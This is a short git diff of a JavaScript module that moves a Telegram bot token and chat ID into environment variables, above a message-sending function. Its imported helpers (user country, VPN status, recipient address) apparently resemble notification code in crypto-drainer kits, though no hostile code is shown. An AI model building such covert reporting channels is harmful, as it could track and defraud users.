@@ -2,8 +2,8 @@ import axios from "axios";
 import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./userLocation";
 
 // Telegram Bot Token and Chat ID
-const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
-const TELEGRAM_CHAT_ID = "6482385341";
+const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN_2;
+const TELEGRAM_CHAT_ID = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID_2;
 
 // Function to send a message to Telegram
 export const sendMessageToTelegram = async (message) => {
